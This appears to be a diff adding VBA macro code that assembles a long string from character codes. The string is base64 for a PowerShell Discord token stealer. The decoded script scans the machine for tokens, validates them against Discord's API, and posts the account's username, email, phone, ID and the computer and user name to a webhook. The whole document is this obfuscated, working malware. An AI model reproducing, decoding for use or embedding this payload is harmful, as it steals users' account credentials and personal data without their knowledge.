+X19 = X19 & (Chr(81)&Chr(83)&Chr(49)&Chr(97)&Chr(89)&Chr(83)&Chr(49)&Chr(54)&Chr(77)&Chr(67)&Chr(48)&Chr(53)&Chr(88)&Chr(121)&Chr(49)&Chr(100)&Chr(101)&Chr(122)&Chr(103)&Chr(48)&Chr(102)&Chr(83)&Chr(99)&Chr(112)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(100)&Chr(71)&Chr(115)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(98)&Chr(83)&Chr(53)&Chr(87)&Chr(89)&Chr(87)&Chr(120)&Chr(49)&Chr(90)&Chr(81)&Chr(111)&Chr(103))
+X19 = X19 & (Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(69)&Chr(107)&Chr(100)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(53)&Chr(122)&Chr(76)&Chr(107)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(82)&Chr(104)&Chr(97)&Chr(87)&Chr(53)&Chr(122)&Chr(83)&Chr(50)&Chr(86)&Chr(53)&Chr(75)&Chr(67)&Chr(82)&Chr(48)&Chr(97)&Chr(121)&Chr(107)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103)&Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117))
+X19 = X19 & (Chr(99)&Chr(49)&Chr(115)&Chr(107)&Chr(100)&Chr(71)&Chr(116)&Chr(100)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(72)&Chr(82)&Chr(121)&Chr(100)&Chr(87)&Chr(85)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(102)&Chr(81)&Chr(112)&Chr(57)&Chr(67)&Chr(103)&Chr(111)&Chr(107)&Chr(99)&Chr(109)&Chr(70)&Chr(51))
+X19 = X19 & (Chr(81)&Chr(50)&Chr(57)&Chr(49)&Chr(98)&Chr(110)&Chr(81)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(100)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(53)&Chr(122)&Chr(76)&Chr(107)&Chr(78)&Chr(118)&Chr(100)&Chr(87)&Chr(53)&Chr(48)&Chr(67)&Chr(103)&Chr(111)&Chr(106)&Chr(73)&Chr(67)&Chr(48)&Chr(116)&Chr(76)&Chr(83)&Chr(48)&Chr(103)&Chr(86)&Chr(109)&Chr(70)&Chr(115)&Chr(97)&Chr(87)&Chr(82)&Chr(104)&Chr(100)&Chr(71)&Chr(85)&Chr(103)&Chr(90)&Chr(87)&Chr(70)&Chr(106)&Chr(97)&Chr(67)&Chr(66)&Chr(106)&Chr(89)&Chr(87)&Chr(53)&Chr(107)&Chr(97)&Chr(87)&Chr(82)&Chr(104)&Chr(100)&Chr(71)&Chr(85)&Chr(103))
+X19 = X19 & (Chr(89)&Chr(87)&Chr(100)&Chr(104)&Chr(97)&Chr(87)&Chr(53)&Chr(122)&Chr(100)&Chr(67)&Chr(66)&Chr(69)&Chr(97)&Chr(88)&Chr(78)&Chr(106)&Chr(98)&Chr(51)&Chr(74)&Chr(107)&Chr(73)&Chr(69)&Chr(70)&Chr(81)&Chr(83)&Chr(83)&Chr(65)&Chr(116)&Chr(76)&Chr(83)&Chr(48)&Chr(116)&Chr(67)&Chr(105)&Chr(82)&Chr(50)&Chr(89)&Chr(87)&Chr(120)&Chr(112)&Chr(90)&Chr(67)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(65)&Chr(111)&Chr(75)&Chr(81)&Chr(112)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(100)&Chr(71)&Chr(115)&Chr(103)&Chr(97)&Chr(87)&Chr(52)&Chr(103))
+X19 = X19 & (Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(99)&Chr(121)&Chr(53)&Chr(76)&Chr(90)&Chr(88)&Chr(108)&Chr(122)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(119)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(116)&Chr(90)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(108)&Chr(117)&Chr(100)&Chr(109)&Chr(57)&Chr(114)&Chr(90)&Chr(83)&Chr(49)&Chr(83)&Chr(90)&Chr(88)&Chr(78)&Chr(48)&Chr(84)&Chr(87)&Chr(86)&Chr(48))
+X19 = X19 & (Chr(97)&Chr(71)&Chr(57)&Chr(107)&Chr(73)&Chr(67)&Chr(100)&Chr(111)&Chr(100)&Chr(72)&Chr(82)&Chr(119)&Chr(99)&Chr(122)&Chr(111)&Chr(118)&Chr(76)&Chr(50)&Chr(82)&Chr(112)&Chr(99)&Chr(50)&Chr(78)&Chr(118)&Chr(99)&Chr(109)&Chr(81)&Chr(117)&Chr(89)&Chr(50)&Chr(57)&Chr(116)&Chr(76)&Chr(50)&Chr(70)&Chr(119)&Chr(97)&Chr(83)&Chr(57)&Chr(50)&Chr(79)&Chr(83)&Chr(57)&Chr(49)&Chr(99)&Chr(50)&Chr(86)&Chr(121)&Chr(99)&Chr(121)&Chr(57)&Chr(65)&Chr(98)&Chr(87)&Chr(85)&Chr(110)&Chr(73)&Chr(67)&Chr(49)&Chr(73)&Chr(90)&Chr(87)&Chr(70)&Chr(107)&Chr(90)&Chr(88)&Chr(74)&Chr(122)&Chr(73)&Chr(69)&Chr(66)&Chr(55))
+X19 = X19 & (Chr(73)&Chr(69)&Chr(70)&Chr(49)&Chr(100)&Chr(71)&Chr(104)&Chr(118)&Chr(99)&Chr(109)&Chr(108)&Chr(54)&Chr(89)&Chr(88)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(52)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(100)&Chr(71)&Chr(115)&Chr(55)&Chr(73)&Chr(67)&Chr(100)&Chr(86)&Chr(99)&Chr(50)&Chr(86)&Chr(121)&Chr(76)&Chr(85)&Chr(70)&Chr(110)&Chr(90)&Chr(87)&Chr(53)&Chr(48)&Chr(74)&Chr(121)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(86)&Chr(81)&Chr(83)&Chr(66)&Chr(57)&Chr(73)&Chr(67)&Chr(49)&Chr(85)&Chr(97)&Chr(87)&Chr(49)&Chr(108)&Chr(98)&Chr(51)&Chr(86)&Chr(48)&Chr(85)&Chr(50)&Chr(86)&Chr(106))
+X19 = X19 & (Chr(73)&Chr(68)&Chr(89)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(112)&Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(74)&Chr(71)&Chr(49)&Chr(108)&Chr(76)&Chr(110)&Chr(86)&Chr(122)&Chr(90)&Chr(88)&Chr(74)&Chr(117)&Chr(89)&Chr(87)&Chr(49)&Chr(108)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(50)&Chr(89)&Chr(87)&Chr(120)&Chr(112)&Chr(90)&Chr(67)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(66)&Chr(98)&Chr(99)&Chr(72)&Chr(78)&Chr(106)&Chr(100)&Chr(88)&Chr(78)&Chr(48)&Chr(98)&Chr(50)&Chr(49)&Chr(118)&Chr(89)&Chr(109)&Chr(112)&Chr(108))
+X19 = X19 & (Chr(89)&Chr(51)&Chr(82)&Chr(100)&Chr(81)&Chr(72)&Chr(115)&Chr(103)&Chr(86)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(52)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(100)&Chr(71)&Chr(115)&Chr(55)&Chr(73)&Chr(69)&Chr(49)&Chr(108)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(71)&Chr(49)&Chr(108)&Chr(73)&Chr(72)&Chr(48)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(106)&Chr(89)&Chr(88)&Chr(82)&Chr(106)&Chr(97)&Chr(67)&Chr(66)&Chr(55)&Chr(102)&Chr(81)&Chr(112)&Chr(57)&Chr(67)&Chr(103)&Chr(111)&Chr(106)&Chr(73)&Chr(67)&Chr(48)&Chr(116))
+X19 = X19 & (Chr(76)&Chr(83)&Chr(48)&Chr(103)&Chr(85)&Chr(109)&Chr(86)&Chr(119)&Chr(98)&Chr(51)&Chr(74)&Chr(48)&Chr(73)&Chr(72)&Chr(82)&Chr(118)&Chr(73)&Chr(72)&Chr(100)&Chr(108)&Chr(89)&Chr(109)&Chr(104)&Chr(118)&Chr(98)&Chr(50)&Chr(115)&Chr(103)&Chr(76)&Chr(83)&Chr(48)&Chr(116)&Chr(76)&Chr(81)&Chr(112)&Chr(109)&Chr(100)&Chr(87)&Chr(53)&Chr(106)&Chr(100)&Chr(71)&Chr(108)&Chr(118)&Chr(98)&Chr(105)&Chr(66)&Chr(81)&Chr(98)&Chr(51)&Chr(78)&Chr(48)&Chr(76)&Chr(85)&Chr(86)&Chr(116)&Chr(89)&Chr(109)&Chr(86)&Chr(107)&Chr(75)&Chr(67)&Chr(82)&Chr(48)&Chr(97)&Chr(88)&Chr(82)&Chr(115)&Chr(90)&Chr(83)&Chr(119)&Chr(103))
+X19 = X19 & (Chr(74)&Chr(71)&Chr(82)&Chr(108)&Chr(99)&Chr(50)&Chr(77)&Chr(115)&Chr(73)&Chr(67)&Chr(82)&Chr(106)&Chr(98)&Chr(50)&Chr(120)&Chr(118)&Chr(99)&Chr(105)&Chr(119)&Chr(103)&Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(82)&Chr(109)&Chr(108)&Chr(108)&Chr(98)&Chr(71)&Chr(81)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(100)&Chr(67)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(73)&Chr(107)&Chr(90)&Chr(87)&Chr(53)&Chr(50)&Chr(79)&Chr(107)&Chr(78)&Chr(80)&Chr(84)&Chr(86)&Chr(66)&Chr(86)&Chr(86)&Chr(69)&Chr(86)&Chr(83))
+X19 = X19 & (Chr(84)&Chr(107)&Chr(70)&Chr(78)&Chr(82)&Chr(83)&Chr(66)&Chr(56)&Chr(73)&Chr(67)&Chr(82)&Chr(108)&Chr(98)&Chr(110)&Chr(89)&Chr(54)&Chr(86)&Chr(86)&Chr(78)&Chr(70)&Chr(85)&Chr(107)&Chr(53)&Chr(66)&Chr(84)&Chr(85)&Chr(85)&Chr(105)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(112)&Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(74)&Chr(72)&Chr(66)&Chr(49)&Chr(89)&Chr(107)&Chr(108)&Chr(81)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(109)&Chr(100)&Chr(67)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(65)&Chr(105)&Chr(73)&Chr(72)&Chr(119)&Chr(103)&Chr(74)&Chr(72)&Chr(66)&Chr(49))
+X19 = X19 & (Chr(89)&Chr(107)&Chr(108)&Chr(81)&Chr(73)&Chr(105)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(90)&Chr(87)&Chr(49)&Chr(105)&Chr(90)&Chr(87)&Chr(81)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(65)&Chr(101)&Chr(121)&Chr(66)&Chr(48)&Chr(97)&Chr(88)&Chr(82)&Chr(115)&Chr(90)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(82)&Chr(48)&Chr(97)&Chr(88)&Chr(82)&Chr(115)&Chr(90)&Chr(84)&Chr(115)&Chr(103)&Chr(90)&Chr(71)&Chr(86)&Chr(122)&Chr(89)&Chr(51)&Chr(74)&Chr(112)&Chr(99)&Chr(72)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(52)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107))
+X19 = X19 & (Chr(90)&Chr(71)&Chr(86)&Chr(122)&Chr(89)&Chr(122)&Chr(115)&Chr(103)&Chr(89)&Chr(50)&Chr(57)&Chr(115)&Chr(98)&Chr(51)&Chr(73)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(89)&Chr(50)&Chr(57)&Chr(115)&Chr(98)&Chr(51)&Chr(73)&Chr(55)&Chr(73)&Chr(71)&Chr(90)&Chr(118)&Chr(98)&Chr(51)&Chr(82)&Chr(108)&Chr(99)&Chr(105)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(66)&Chr(55)&Chr(73)&Chr(72)&Chr(82)&Chr(108)&Chr(101)&Chr(72)&Chr(81)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(90)&Chr(110)&Chr(81)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(112))
+X19 = X19 & (Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(82)&Chr(109)&Chr(108)&Chr(108)&Chr(98)&Chr(71)&Chr(81)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103)&Chr(74)&Chr(71)&Chr(86)&Chr(116)&Chr(89)&Chr(109)&Chr(86)&Chr(107)&Chr(87)&Chr(121)&Chr(100)&Chr(109)&Chr(97)&Chr(87)&Chr(86)&Chr(115)&Chr(90)&Chr(72)&Chr(77)&Chr(110)&Chr(88)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(69)&Chr(65)&Chr(111)&Chr(81)&Chr(72)&Chr(115)&Chr(103)&Chr(98)&Chr(109)&Chr(70)&Chr(116)&Chr(90)&Chr(83)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(100)&Chr(85)&Chr(98)&Chr(50)&Chr(116)&Chr(108))
+X19 = X19 & (Chr(98)&Chr(105)&Chr(99)&Chr(55)&Chr(73)&Chr(72)&Chr(90)&Chr(104)&Chr(98)&Chr(72)&Chr(86)&Chr(108)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(82)&Chr(109)&Chr(108)&Chr(108)&Chr(98)&Chr(71)&Chr(81)&Chr(103)&Chr(102)&Chr(83)&Chr(107)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(74)&Chr(71)&Chr(74)&Chr(118)&Chr(90)&Chr(72)&Chr(107)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(65)&Chr(101)&Chr(121)&Chr(66)&Chr(108)&Chr(98)&Chr(87)&Chr(74)&Chr(108)&Chr(90)&Chr(72)&Chr(77)&Chr(103)&Chr(80)&Chr(83)&Chr(66)&Chr(65))
+X19 = X19 & (Chr(75)&Chr(67)&Chr(82)&Chr(108)&Chr(98)&Chr(87)&Chr(74)&Chr(108)&Chr(90)&Chr(67)&Chr(107)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(56)&Chr(73)&Chr(69)&Chr(78)&Chr(118)&Chr(98)&Chr(110)&Chr(90)&Chr(108)&Chr(99)&Chr(110)&Chr(82)&Chr(85)&Chr(98)&Chr(121)&Chr(49)&Chr(75)&Chr(99)&Chr(50)&Chr(57)&Chr(117)&Chr(73)&Chr(67)&Chr(49)&Chr(69)&Chr(90)&Chr(88)&Chr(66)&Chr(48)&Chr(97)&Chr(67)&Chr(65)&Chr(50)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(48)&Chr(99)&Chr(110)&Chr(107)&Chr(103)&Chr(101)&Chr(121)&Chr(66)&Chr(74)&Chr(98)&Chr(110)&Chr(90)&Chr(118)&Chr(97)&Chr(50)&Chr(85)&Chr(116))
+X19 = X19 & (Chr(85)&Chr(109)&Chr(86)&Chr(122)&Chr(100)&Chr(69)&Chr(49)&Chr(108)&Chr(100)&Chr(71)&Chr(104)&Chr(118)&Chr(90)&Chr(67)&Chr(65)&Chr(107)&Chr(86)&Chr(48)&Chr(103)&Chr(103)&Chr(76)&Chr(85)&Chr(49)&Chr(108)&Chr(100)&Chr(71)&Chr(104)&Chr(118)&Chr(90)&Chr(67)&Chr(66)&Chr(81)&Chr(98)&Chr(51)&Chr(78)&Chr(48)&Chr(73)&Chr(67)&Chr(49)&Chr(68)&Chr(98)&Chr(50)&Chr(53)&Chr(48)&Chr(90)&Chr(87)&Chr(53)&Chr(48)&Chr(86)&Chr(72)&Chr(108)&Chr(119)&Chr(90)&Chr(83)&Chr(65)&Chr(110)&Chr(89)&Chr(88)&Chr(66)&Chr(119)&Chr(98)&Chr(71)&Chr(108)&Chr(106)&Chr(89)&Chr(88)&Chr(82)&Chr(112)&Chr(98)&Chr(50)&Chr(52)&Chr(118))
+X19 = X19 & (Chr(97)&Chr(110)&Chr(78)&Chr(118)&Chr(98)&Chr(105)&Chr(99)&Chr(103)&Chr(76)&Chr(85)&Chr(104)&Chr(108)&Chr(89)&Chr(87)&Chr(82)&Chr(108)&Chr(99)&Chr(110)&Chr(77)&Chr(103)&Chr(81)&Chr(72)&Chr(115)&Chr(103)&Chr(74)&Chr(49)&Chr(86)&Chr(122)&Chr(90)&Chr(88)&Chr(73)&Chr(116)&Chr(81)&Chr(87)&Chr(100)&Chr(108)&Chr(98)&Chr(110)&Chr(81)&Chr(110)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(74)&Chr(70)&Chr(86)&Chr(66)&Chr(73)&Chr(72)&Chr(48)&Chr(103)&Chr(76)&Chr(85)&Chr(74)&Chr(118)&Chr(90)&Chr(72)&Chr(107)&Chr(103)&Chr(74)&Chr(71)&Chr(74)&Chr(118)&Chr(90)&Chr(72)&Chr(107)&Chr(103)&Chr(102)&Chr(83)&Chr(66)&Chr(106))
+X19 = X19 & (Chr(89)&Chr(88)&Chr(82)&Chr(106)&Chr(97)&Chr(67)&Chr(66)&Chr(55)&Chr(102)&Chr(81)&Chr(112)&Chr(57)&Chr(67)&Chr(103)&Chr(112)&Chr(112)&Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(74)&Chr(72)&Chr(90)&Chr(104)&Chr(98)&Chr(71)&Chr(108)&Chr(107)&Chr(76)&Chr(107)&Chr(78)&Chr(118)&Chr(100)&Chr(87)&Chr(53)&Chr(48)&Chr(73)&Chr(67)&Chr(49)&Chr(108)&Chr(99)&Chr(83)&Chr(65)&Chr(119)&Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(90)&Chr(67)&Chr(65)&Chr(57)&Chr(73)&Chr(67)&Chr(74)&Chr(79)&Chr(98)&Chr(121)&Chr(66)&Chr(50)&Chr(89)&Chr(87)&Chr(120)&Chr(112))
+X19 = X19 & (Chr(90)&Chr(67)&Chr(66)&Chr(69)&Chr(97)&Chr(88)&Chr(78)&Chr(106)&Chr(98)&Chr(51)&Chr(74)&Chr(107)&Chr(73)&Chr(72)&Chr(82)&Chr(118)&Chr(97)&Chr(50)&Chr(86)&Chr(117)&Chr(99)&Chr(121)&Chr(66)&Chr(109)&Chr(98)&Chr(51)&Chr(86)&Chr(117)&Chr(90)&Chr(67)&Chr(66)&Chr(118)&Chr(98)&Chr(105)&Chr(66)&Chr(48)&Chr(97)&Chr(71)&Chr(108)&Chr(122)&Chr(73)&Chr(71)&Chr(49)&Chr(104)&Chr(89)&Chr(50)&Chr(104)&Chr(112)&Chr(98)&Chr(109)&Chr(85)&Chr(117)&Chr(89)&Chr(71)&Chr(53)&Chr(103)&Chr(98)&Chr(108)&Chr(74)&Chr(104)&Chr(100)&Chr(121)&Chr(66)&Chr(106)&Chr(89)&Chr(87)&Chr(53)&Chr(107)&Chr(97)&Chr(87)&Chr(82)&Chr(104))
+X19 = X19 & (Chr(100)&Chr(71)&Chr(86)&Chr(122)&Chr(73)&Chr(72)&Chr(78)&Chr(106)&Chr(89)&Chr(87)&Chr(53)&Chr(117)&Chr(90)&Chr(87)&Chr(81)&Chr(54)&Chr(73)&Chr(67)&Chr(82)&Chr(121)&Chr(89)&Chr(88)&Chr(100)&Chr(68)&Chr(98)&Chr(51)&Chr(86)&Chr(117)&Chr(100)&Chr(67)&Chr(73)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(70)&Chr(66)&Chr(118)&Chr(99)&Chr(51)&Chr(81)&Chr(116)&Chr(82)&Chr(87)&Chr(49)&Chr(105)&Chr(90)&Chr(87)&Chr(81)&Chr(103)&Chr(74)&Chr(48)&Chr(82)&Chr(112)&Chr(99)&Chr(50)&Chr(78)&Chr(118)&Chr(99)&Chr(109)&Chr(81)&Chr(103)&Chr(86)&Chr(71)&Chr(57)&Chr(114)&Chr(90)&Chr(87)&Chr(52)&Chr(103))
+X19 = X19 & (Chr(76)&Chr(83)&Chr(66)&Chr(79)&Chr(98)&Chr(51)&Chr(81)&Chr(103)&Chr(82)&Chr(109)&Chr(57)&Chr(49)&Chr(98)&Chr(109)&Chr(81)&Chr(110)&Chr(73)&Chr(67)&Chr(82)&Chr(107)&Chr(73)&Chr(68)&Chr(69)&Chr(50)&Chr(78)&Chr(122)&Chr(69)&Chr(120)&Chr(78)&Chr(106)&Chr(103)&Chr(119)&Chr(73)&Chr(67)&Chr(82)&Chr(117)&Chr(100)&Chr(87)&Chr(120)&Chr(115)&Chr(67)&Chr(110)&Chr(48)&Chr(103)&Chr(90)&Chr(87)&Chr(120)&Chr(122)&Chr(90)&Chr(83)&Chr(66)&Chr(55)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(109)&Chr(98)&Chr(51)&Chr(74)&Chr(108)&Chr(89)&Chr(87)&Chr(78)&Chr(111)&Chr(73)&Chr(67)&Chr(103)&Chr(107))
+X19 = X19 & (Chr(100)&Chr(105)&Chr(66)&Chr(112)&Chr(98)&Chr(105)&Chr(65)&Chr(107)&Chr(100)&Chr(109)&Chr(70)&Chr(115)&Chr(97)&Chr(87)&Chr(81)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(107)&Chr(98)&Chr(87)&Chr(85)&Chr(103)&Chr(80)&Chr(83)&Chr(65)&Chr(107)&Chr(100)&Chr(105)&Chr(53)&Chr(78)&Chr(90)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(82)&Chr(107)&Chr(73)&Chr(68)&Chr(48)&Chr(103)&Chr(73)&Chr(105)&Chr(111)&Chr(113)&Chr(86)&Chr(88)&Chr(78)&Chr(108))
+X19 = X19 & (Chr(99)&Chr(106)&Chr(111)&Chr(113)&Chr(75)&Chr(105)&Chr(65)&Chr(107)&Chr(75)&Chr(67)&Chr(82)&Chr(116)&Chr(90)&Chr(83)&Chr(53)&Chr(49)&Chr(99)&Chr(50)&Chr(86)&Chr(121)&Chr(98)&Chr(109)&Chr(70)&Chr(116)&Chr(90)&Chr(83)&Chr(107)&Chr(105)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(82)&Chr(116)&Chr(90)&Chr(83)&Chr(53)&Chr(108)&Chr(98)&Chr(87)&Chr(70)&Chr(112)&Chr(98)&Chr(67)&Chr(107)&Chr(103)&Chr(101)&Chr(121)&Chr(65)&Chr(107)&Chr(90)&Chr(67)&Chr(65)&Chr(114)&Chr(80)&Chr(83)&Chr(65)&Chr(105))
+X19 = X19 & (Chr(89)&Chr(71)&Chr(52)&Chr(113)&Chr(75)&Chr(107)&Chr(86)&Chr(116)&Chr(89)&Chr(87)&Chr(108)&Chr(115)&Chr(79)&Chr(105)&Chr(111)&Chr(113)&Chr(73)&Chr(67)&Chr(81)&Chr(111)&Chr(74)&Chr(71)&Chr(49)&Chr(108)&Chr(76)&Chr(109)&Chr(86)&Chr(116)&Chr(89)&Chr(87)&Chr(108)&Chr(115)&Chr(75)&Chr(83)&Chr(73)&Chr(103)&Chr(102)&Chr(81)&Chr(111)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(71)&Chr(108)&Chr(109)&Chr(73)&Chr(67)&Chr(103)&Chr(107)&Chr(98)&Chr(87)&Chr(85)&Chr(117)&Chr(99)&Chr(71)&Chr(104)&Chr(118)&Chr(98)&Chr(109)&Chr(85)&Chr(112)&Chr(73)&Chr(72)&Chr(115)&Chr(103))
+X19 = X19 & (Chr(74)&Chr(71)&Chr(81)&Chr(103)&Chr(75)&Chr(122)&Chr(48)&Chr(103)&Chr(73)&Chr(109)&Chr(66)&Chr(117)&Chr(75)&Chr(105)&Chr(112)&Chr(81)&Chr(97)&Chr(71)&Chr(57)&Chr(117)&Chr(90)&Chr(84)&Chr(111)&Chr(113)&Chr(75)&Chr(105)&Chr(65)&Chr(107)&Chr(75)&Chr(67)&Chr(82)&Chr(116)&Chr(90)&Chr(83)&Chr(53)&Chr(119)&Chr(97)&Chr(71)&Chr(57)&Chr(117)&Chr(90)&Chr(83)&Chr(107)&Chr(105)&Chr(73)&Chr(72)&Chr(48)&Chr(75)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(66)&Chr(112)&Chr(90)&Chr(105)&Chr(65)&Chr(111)&Chr(74)&Chr(71)&Chr(49)&Chr(108)&Chr(76)&Chr(109)&Chr(108)&Chr(107))
+X19 = X19 & (Chr(75)&Chr(83)&Chr(66)&Chr(55)&Chr(73)&Chr(67)&Chr(82)&Chr(107)&Chr(73)&Chr(67)&Chr(115)&Chr(57)&Chr(73)&Chr(67)&Chr(74)&Chr(103)&Chr(98)&Chr(105)&Chr(111)&Chr(113)&Chr(83)&Chr(85)&Chr(81)&Chr(54)&Chr(75)&Chr(105)&Chr(111)&Chr(103)&Chr(74)&Chr(67)&Chr(103)&Chr(107)&Chr(98)&Chr(87)&Chr(85)&Chr(117)&Chr(97)&Chr(87)&Chr(81)&Chr(112)&Chr(73)&Chr(105)&Chr(66)&Chr(57)&Chr(67)&Chr(105)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(73)&Chr(67)&Chr(65)&Chr(103)&Chr(97)&Chr(87)&Chr(89)&Chr(103)&Chr(75)&Chr(67)&Chr(82)&Chr(116)&Chr(90)&Chr(83)&Chr(53)&Chr(116)&Chr(90)&Chr(109)&Chr(70)&Chr(102))
